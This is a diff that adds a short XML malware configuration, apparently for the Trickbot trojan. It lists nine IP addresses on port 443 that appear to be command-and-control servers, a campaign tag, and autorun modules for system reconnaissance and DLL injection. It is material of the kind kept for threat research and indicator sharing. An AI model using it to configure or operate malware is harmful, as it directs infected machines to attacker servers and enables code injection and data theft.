@@ -1,0 +1,19 @@
+<mcconf>
+    <ver>1000016</ver>
+    <gtag>ser24</gtag>
+    <servs>
+        <srv>190.138.249.45:443</srv>
+        <srv>36.66.107.162:443</srv>
+        <srv>200.116.206.58:443</srv>
+        <srv>203.92.62.46:443</srv>
+        <srv>84.42.159.138:443</srv>
+        <srv>149.202.30.123:443</srv>
+        <srv>178.33.82.5:443</srv>
+        <srv>107.181.161.221:443</srv>
+        <srv>185.25.51.118:443</srv>
+    </servs>
+    <autorun>
+        <module name="systeminfo" ctl="GetSystemInfo" />
+        <module name="injectDll" />
+    </autorun>
+</mcconf>
